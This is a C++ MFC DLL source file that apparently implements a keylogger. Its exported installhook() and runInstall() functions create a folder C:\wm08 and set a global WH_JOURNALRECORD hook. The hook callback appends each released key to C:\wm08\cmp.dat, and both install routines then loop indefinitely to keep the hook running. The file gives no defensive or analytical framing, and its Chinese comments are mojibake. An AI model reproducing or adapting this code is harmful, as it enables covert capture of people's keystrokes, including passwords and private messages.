// KM_dll.cpp : ���� DLL �ĳ�ʼ�����̡�
//

#include "stdafx.h"
#include "KM_dll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//
//TODO: ����� DLL ����� MFC DLL �Ƕ�̬���ӵģ�
//		��Ӵ� DLL �������κε���
//		MFC �ĺ������뽫 AFX_MANAGE_STATE ����ӵ�
//		�ú�������ǰ�档
//
//		����:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// �˴�Ϊ��ͨ������
//		}
//
//		�˺������κ� MFC ����
//		������ÿ��������ʮ����Ҫ������ζ��
//		��������Ϊ�����еĵ�һ�����
//		���֣������������ж������������
//		������Ϊ���ǵĹ��캯���������� MFC
//		DLL ���á�
//
//		�й�������ϸ��Ϣ��
//		����� MFC ����˵�� 33 �� 58��
//

// CKM_dllApp

BEGIN_MESSAGE_MAP(CKM_dllApp, CWinApp)
END_MESSAGE_MAP()


// CKM_dllApp ����

CKM_dllApp::CKM_dllApp()
{
	// TODO: �ڴ˴���ӹ�����룬
	// ��������Ҫ�ĳ�ʼ�������� InitInstance ��
}


// Ψһ��һ�� CKM_dllApp ����

CKM_dllApp theApp;


// CKM_dllApp ��ʼ��

static HHOOK hkb = NULL;
HINSTANCE hIns;

BOOL CKM_dllApp::InitInstance()
{
	CWinApp::InitInstance();
    hIns = (HINSTANCE)this;
	return TRUE;
}


void  __declspec(dllexport)__stdcall installhook()
{
    system("md c:\\wm08");
    hkb = SetWindowsHookExW(WH_JOURNALRECORD,//WH_KEYBOARD,
                           (HOOKPROC)KeyboardProc,
                           hIns,
                           0);
    while (true)
        Sleep(1000000000);
}




static HWND hWndMain;
static HHOOK hKeyHook;
static const UINT myMessage = 2000;

void SetHook(HWND hMainWnd, bool nCode)
{
    if (nCode)
    {
        hWndMain = hMainWnd;
        hKeyHook = SetWindowsHookEx(WH_JOURNALRECORD,
                           (HOOKPROC)KeyboardProc,
                           hIns,
                           0);
    }
    else
        UnhookWindowsHookEx(hKeyHook);
}

LRESULT CALLBACK KeyboardProc(int nCode,
                              WPARAM wParam,
                              LPARAM lParam)
{    
    /*
    freopen("C:\\wm08\\cmp.dat", "a", stdout);
    if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
    {
        putchar(wParam);
    }
    fclose(stdout);
    */
    EVENTMSG *keyMSG = (EVENTMSG *)lParam;
    if ((nCode == HC_ACTION) && (keyMSG->message == WM_KEYUP))
    {
        
        freopen("C:\\wm08\\cmp.dat", "a", stdout);
        putchar(keyMSG->paramL);
        fclose(stdout);
        //PostMessageW(hWndMain, myMessage, (char)(keyMSG->paramL), 1);
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
    //return CallNextHookEx(hkb, nCode, wParam, lParam);
}

void test()
{
    freopen("test.txt", "a", stdout);
    printf("aaa");
    fclose(stdout);
}

void runInstall()
{
    system("md c:\\wm08");
    hKeyHook = SetWindowsHookEx(WH_JOURNALRECORD,
        (HOOKPROC)KeyboardProc,
        hIns,
        0);
    test();
    while (true)
    {
        ;
    }
}